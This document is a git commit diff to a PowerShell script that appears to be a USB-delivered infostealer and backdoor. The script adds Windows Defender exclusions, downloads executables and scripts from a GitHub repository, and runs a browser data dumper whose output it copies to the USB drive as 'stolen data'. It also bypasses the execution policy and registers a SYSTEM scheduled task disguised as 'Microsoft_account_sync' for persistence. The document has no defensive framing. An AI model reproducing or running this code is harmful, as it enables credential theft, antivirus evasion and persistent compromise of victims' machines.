f5f4eba459bec18c55de1d97d519b48a621e4da7
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-12-07 00:02:30 +0000

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -1,17 +1,24 @@
-echo "-------you can safely remove USB--------"
-# disable rtp
-Set-MpPreference -DisableRealtimeMonitoring $true
 # add exclusion to self
 Add-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1.exe"
-# fetch payload from github
+# download info dumper
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
+# add exclusion to info dumper
+Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
+# run info dumper
+& "C:\Windows\System32\chromelevator_x64.exe" --output-path "C:\Windows\System32\output" all
+# create usbdrive variable
+$usbDrive = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
+# copy stolen data
+Copy-Item -Path 'C:\Windows\System32\output' -Destination "$($usbDrive.DriveLetter):\" -Force
+# inform user to remove usb
+echo "-------you can safely remove USB--------"
+# fetch payloads from github
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
-Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "C:\Windows\System32\cleanup.ps1"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/exit.ps1' -OutFile "C:\Windows\System32\exit.ps1"
-# add exlusion to files
+# add exlusion to file
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
-Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
 # set execution policy
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
 # add schedule to start ddrcc.ps1
@@ -23,8 +30,6 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 Register-ScheduledTask -TaskName "Microsoft_account_sync" -Action $action -Trigger $trigger -Principal $principal
 # start process
 & "C:\Windows\System32\ddrcc.ps1"
-# run info stealer
-& "C:\Windows\System32\chromelevator_x64.exe" all
 # remove info dumper
 Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
 # close terminal
